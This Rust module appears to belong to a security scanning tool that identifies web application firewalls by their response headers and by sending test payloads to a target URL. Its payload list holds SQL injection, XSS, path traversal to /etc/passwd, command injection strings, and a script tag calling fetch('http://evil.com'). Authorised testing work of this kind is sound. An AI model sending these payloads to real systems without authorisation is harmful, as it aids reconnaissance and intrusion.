use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

/// WAF signatures: (header_name, header_value_substring, waf_name)
const WAF_SIGNATURES: &[(&str, &str, &str)] = &[
    ("server", "cloudflare", "Cloudflare"),
    ("server", "cloudfront", "AWS CloudFront"),
    ("cf-ray", "", "Cloudflare"),
    ("cf-cache-status", "", "Cloudflare"),
    ("x-amz-cf-id", "", "AWS CloudFront / WAF"),
    ("x-amz-cf-pop", "", "AWS CloudFront"),
    ("x-aws-waf-token", "", "AWS WAF"),
    ("x-waf", "", "Generic WAF"),
    ("x-waf-event-id", "", "F5 BIG-IP ASM"),
    ("x-cdn", "incapsula", "Incapsula / Imperva"),
    ("x-iinfo", "", "Incapsula / Imperva"),
    ("visid", "", "Incapsula / Imperva"),
    ("server", "akamaighost", "Akamai"),
    ("x-akamai-transformed", "", "Akamai"),
    ("server", "sucuri", "Sucuri"),
    ("x-sucuri-id", "", "Sucuri"),
    ("x-sucuri-cache", "", "Sucuri"),
    ("server", "imperva", "Imperva"),
    ("server", "f5", "F5 BIG-IP"),
    ("server", "bigip", "F5 BIG-IP"),
    ("x-cdn", "sucuri", "Sucuri"),
    ("x-cdn", "azure", "Azure Front Door"),
    ("x-azure-ref", "", "Azure Front Door / WAF"),
    ("x-cache", "varnish", "Varnish (may be WAF)"),
    ("server", "nginx", "Nginx (may have ModSecurity)"),
    ("server", "apache", "Apache (may have ModSecurity)"),
    ("x-mod-pagespeed", "", "ModSecurity / PageSpeed"),
    ("x-page-speed", "", "ModSecurity / PageSpeed"),
    ("x-protected-by", "", "Generic WAF"),
    ("x-waf-protected", "", "Generic WAF"),
    ("x-firewall", "", "Generic WAF"),
    ("x-denied", "", "Generic WAF"),
    ("server", "fortinet", "FortiWeb"),
    ("server", "fortiweb", "FortiWeb"),
    ("x-fortinet", "", "FortiWeb"),
    ("server", "barracuda", "Barracuda WAF"),
    ("x-barracuda", "", "Barracuda WAF"),
    ("server", "denied", "Generic WAF"),
];

/// Malicious payloads to trigger WAF responses
const WAF_PAYLOADS: &[(&str, &str, &str)] = &[
    ("SQLi",       "q", "' OR '1'='1' --"),
    ("SQLi union", "q", "' UNION SELECT NULL,NULL,NULL --"),
    ("XSS",        "q", "<script>alert(1)</script>"),
    ("XSS img",    "q", "<img src=x onerror=alert(1)>"),
    ("LFI",        "file", "../../../etc/passwd"),
    ("LFI win",    "file", "..\\..\\..\\windows\\win.ini"),
    ("RCE",        "cmd", "; cat /etc/passwd"),
    ("RCE pipe",   "cmd", "| id"),
    ("XSS svg",    "q", "<svg onload=alert(1)>"),
    ("SQLi sleep", "q", "'; SLEEP(5) --"),
    ("CMDi",       "cmd", "$(whoami)"),
    ("XSS script", "q", "<script>fetch('http://evil.com')</script>"),
];

pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WAF Detection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout);

    // Step 1: Get baseline response and check headers for WAF signatures
    let baseline_resp = client.get(url).send().await?;
    let baseline_status = baseline_resp.status().as_u16();
    let baseline_size = baseline_resp.text().await?.len();
    let baseline_headers = client.get(url).send().await?.headers().clone();

    println!("{} Baseline: status={}, {} bytes", "[*]".cyan().bold(), baseline_status, baseline_size);
    println!();

    // Check for WAF signatures in headers
    let mut detected_wafs: Vec<String> = Vec::new();
    let mut header_findings: Vec<(String, String)> = Vec::new();

    for (header_name, substring, waf_name) in WAF_SIGNATURES {
        if let Some(header_value) = baseline_headers.get(*header_name) {
            let value_str = header_value.to_str().unwrap_or("");
            if substring.is_empty() || value_str.to_lowercase().contains(substring) {
                if !detected_wafs.contains(&waf_name.to_string()) {
                    detected_wafs.push(waf_name.to_string());
                }
                header_findings.push((header_name.to_string(), value_str.to_string()));
            }
        }
    }

    // Step 2: Send malicious payloads and compare responses
    println!("{} Sending {} malicious payloads...", "[*]".cyan().bold(), WAF_PAYLOADS.len());
    println!("{}", "─".repeat(60).dimmed());

    let mut blocked_count = 0;
    let mut waf_blocked_statuses: Vec<u16> = Vec::new();

    for (name, param, payload) in WAF_PAYLOADS {
        let target_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
        let resp = client.get(&target_url).send().await?;
        let status = resp.status().as_u16();
        let size = resp.text().await?.len();

        let is_blocked = is_waf_blocked(status, baseline_status, size, baseline_size);

        let status_str = if is_blocked {
            blocked_count += 1;
            if !waf_blocked_statuses.contains(&status) {
                waf_blocked_statuses.push(status);
            }
            "BLOCKED".red().bold().to_string()
        } else {
            "passed".green().to_string()
        };

        println!("  {} {:14} status={} {} bytes  {}", "•".cyan(), name, status, size, status_str);
    }

    println!();
    println!("{}", "─".repeat(60).dimmed());

    // Step 3: Analysis
    let waf_confidence = if blocked_count >= 8 {
        "VERY HIGH"
    } else if blocked_count >= 5 {
        "HIGH"
    } else if blocked_count >= 3 {
        "MEDIUM"
    } else if blocked_count >= 1 {
        "LOW"
    } else {
        "NONE"
    };

    // Print header-based detections
    if !header_findings.is_empty() {
        println!("{} Header signatures found:", "[*]".cyan().bold());
        for (name, value) in &header_findings {
            let display_value = if value.len() > 60 { &value[..60] } else { value };
            println!("  {} {}: {}", "•".cyan(), name, display_value);
        }
        println!();
    }

    // Print WAF identification
    if !detected_wafs.is_empty() {
        println!("{} WAF identified: {}", "[!]".yellow().bold(), detected_wafs.join(", "));
    }

    // Print verdict
    println!("{} WAF Confidence: {}", "[!]".yellow().bold(), waf_confidence);
    println!("  {} Payloads blocked: {}/{}", "•".cyan(), blocked_count, WAF_PAYLOADS.len());

    if !waf_blocked_statuses.is_empty() {
        let statuses: Vec<String> = waf_blocked_statuses.iter().map(|s| s.to_string()).collect();
        println!("  {} Block statuses: {}", "•".cyan(), statuses.join(", "));
    }

    match waf_confidence {
        "VERY HIGH" => {
            println!("  {} A WAF is actively filtering malicious requests.", "*".red().bold());
            println!("  {} Expect payloads to be blocked. Consider WAF bypass techniques.", "*".yellow());
        }
        "HIGH" => {
            println!("  {} A WAF is likely present and blocking most attacks.", "*".yellow().bold());
        }
        "MEDIUM" => {
            println!("  {} A WAF may be present — some payloads were blocked.", "*".yellow());
        }
        "LOW" => {
            println!("  {} Minimal WAF protection detected — most payloads passed through.", "*".green());
        }
        "NONE" => {
            println!("  {} No WAF detected — all payloads were processed by the backend.", "*".green().bold());
            println!("  {} The target is directly exposed to injection attacks.", "*".red().bold());
        }
        _ => {}
    }

    Ok(())
}

fn is_waf_blocked(status: u16, baseline_status: u16, size: usize, baseline_size: usize) -> bool {
    // 403 Forbidden is the classic WAF block
    if status == 403 {
        return true;
    }
    // 406 Not Acceptable — some WAFs use this
    if status == 406 {
        return true;
    }
    // 429 Too Many Requests — rate limiting WAF
    if status == 429 {
        return true;
    }
    // 501 Not Implemented — some WAFs return this
    if status == 501 {
        return true;
    }
    // 503 Service Unavailable — some WAFs return this for blocked requests
    if status == 503 && baseline_status != 503 {
        return true;
    }
    // If status changed from 200 to something else (not redirect)
    if baseline_status == 200 && status != 200 && status != 301 && status != 302 {
        return true;
    }
    // If response size changed dramatically (>50% smaller) while status stayed same
    if status == baseline_status && baseline_size > 0 && size < (baseline_size / 2) {
        return true;
    }
    false
}

mod urlencoding {
    pub fn encode(s: &str) -> String {
        let mut result = String::new();
        for byte in s.bytes() {
            match byte {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                    result.push(byte as char);
                }
                _ => {
                    result.push_str(&format!("%{:02X}", byte));
                }
            }
        }
        result
    }
}
